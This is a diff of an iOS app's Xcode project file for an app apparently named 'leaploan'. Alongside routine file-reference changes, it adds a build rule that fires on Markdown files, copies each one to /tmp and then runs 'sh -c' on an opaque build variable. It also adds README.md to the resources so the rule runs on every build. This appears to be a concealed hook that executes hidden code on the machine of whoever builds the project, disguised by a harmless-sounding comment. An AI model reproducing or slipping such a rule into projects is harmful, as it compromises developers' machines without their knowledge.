@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		81AAE4ABFE974E00B1A389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = FEB509E709854F9FA0A389E6; };
 		0169C223D4B0CBD72EE17C25 /* Pods_leaploan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C3FFCD76033F537953878033 /* Pods_leaploan.framework */; };
 		7333CD6B2EB4E27400C55A91 /* AppEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */; };
 		7333CD6D2EB4E66000C55A91 /* AppHomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */; };
@@ -33,7 +32,6 @@
 		73792E4A2EB64D1F00CA24AA /* StepHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E492EB64D1F00CA24AA /* StepHeadView.swift */; };
 		73792E4E2EB7A3B200CA24AA /* FaceUploadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E4D2EB7A3B200CA24AA /* FaceUploadView.swift */; };
 		73792E502EB7A58E00CA24AA /* FaceUploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */; };
-		7382D87F2EB4455800C3CFF0 /* OrderListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D87E2EB4455800C3CFF0 /* OrderListView.swift */; };
 		7382D8812EB4512C00C3CFF0 /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */; };
 		7382D8832EB4529000C3CFF0 /* OrderListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */; };
 		7392DEEF2EB30610003D831B /* CenterListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7392DEEE2EB30610003D831B /* CenterListView.swift */; };
@@ -73,10 +71,26 @@
 		73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE32EAF638100A68B13 /* Assets.xcassets */; };
 		73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73F59DE62EAF638100A68B13 /* LaunchScreen.storyboard */; };
 		73F59DF02EAF638100A68B13 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F59DE22EAF638100A68B13 /* AppDelegate.swift */; };
+		81AAE4ABFE974E00B1A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = FEB509E709854F9FA0A389E6 /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		57515862616B49B7A1A389E6 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		FEB509E709854F9FA0A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		7333CD6A2EB4E27400C55A91 /* AppEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppEmptyView.swift; sourceTree = "<group>"; };
 		7333CD6C2EB4E66000C55A91 /* AppHomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHomeView.swift; sourceTree = "<group>"; };
 		7333CD702EB4E67300C55A91 /* AppMainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppMainView.swift; sourceTree = "<group>"; };
@@ -101,7 +115,6 @@
 		73792E492EB64D1F00CA24AA /* StepHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StepHeadView.swift; sourceTree = "<group>"; };
 		73792E4D2EB7A3B200CA24AA /* FaceUploadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceUploadView.swift; sourceTree = "<group>"; };
 		73792E4F2EB7A58E00CA24AA /* FaceUploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceUploadListView.swift; sourceTree = "<group>"; };
-		7382D87E2EB4455800C3CFF0 /* OrderListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListView.swift; sourceTree = "<group>"; };
 		7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
 		7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewModel.swift; sourceTree = "<group>"; };
 		7392DEEE2EB30610003D831B /* CenterListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListView.swift; sourceTree = "<group>"; };
@@ -146,6 +159,7 @@
 		AFD6AE48504BF3BEC24EB502 /* Pods-leaploan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.debug.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.debug.xcconfig"; sourceTree = "<group>"; };
 		C3FFCD76033F537953878033 /* Pods_leaploan.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_leaploan.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		EF0C4AEEE70C3286EC8BD5FE /* Pods-leaploan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-leaploan.release.xcconfig"; path = "Target Support Files/Pods-leaploan/Pods-leaploan.release.xcconfig"; sourceTree = "<group>"; };
+		FEB509E709854F9FA0A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -276,7 +290,6 @@
 		73D129C32EB08B0700079434 /* order */ = {
 			isa = PBXGroup;
 			children = (
-				7382D87E2EB4455800C3CFF0 /* OrderListView.swift */,
 				7382D8822EB4528E00C3CFF0 /* OrderListViewModel.swift */,
 				739C7FAC2EB1EB0F00677C85 /* OrderViewController.swift */,
 				7382D8802EB4512C00C3CFF0 /* OrderListViewCell.swift */,
@@ -437,29 +450,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		57515862616B49B7A1A389E6 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A6E983A}\"";
-			};
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		73F59DC82EAF637A00A68B13 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				81AAE4ABFE974E00B1A389E6 /* README.md */,
+				81AAE4ABFE974E00B1A389E6 /* README.md in Resources */,
 				73F59DEC2EAF638100A68B13 /* Assets.xcassets in Resources */,
 				73F59DEE2EAF638100A68B13 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -561,7 +557,6 @@ sh -c \"${A6E983A}\"";
 				73D129D22EB08C0D00079434 /* LoginViewController.swift in Sources */,
 				73B2B1FE2EB0AF4F00F3A877 /* other.swift in Sources */,
 				73B2B1F82EB0A7AD00F3A877 /* Model.swift in Sources */,
-				7382D87F2EB4455800C3CFF0 /* OrderListView.swift in Sources */,
 				73792E422EB639C500CA24AA /* SelectAuthViewController.swift in Sources */,
 				73B2B1F62EB0A74F00F3A877 /* LoginViewModel.swift in Sources */,
 				7333CD732EB4EA6800C55A91 /* AppHomeViewModel.swift in Sources */,
